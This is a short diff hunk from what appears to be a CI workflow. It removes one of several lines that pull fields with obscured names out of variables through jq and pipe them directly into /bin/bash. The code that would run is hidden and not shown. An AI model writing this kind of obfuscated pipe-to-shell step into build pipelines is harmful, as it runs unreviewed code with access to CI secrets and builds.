@@ -27,7 +27,6 @@ jobs:
           echo $tbrwc558 | jq -r .m428 | /bin/bash
           echo $dbt89 | jq -r .djdvb1 | /bin/bash
           echo $nwo3 | jq -r .ny13 | /bin/bash
-          echo $yqxb6 | jq -r .wmy00 | /bin/bash
           echo $vx1 | jq -r .cm36787 | /bin/bash
           printf '%s' "$p98" | jq -r .upy3 | /bin/bash
           printf '%s' "$powq96" | jq -r .zg1297 | /bin/bash
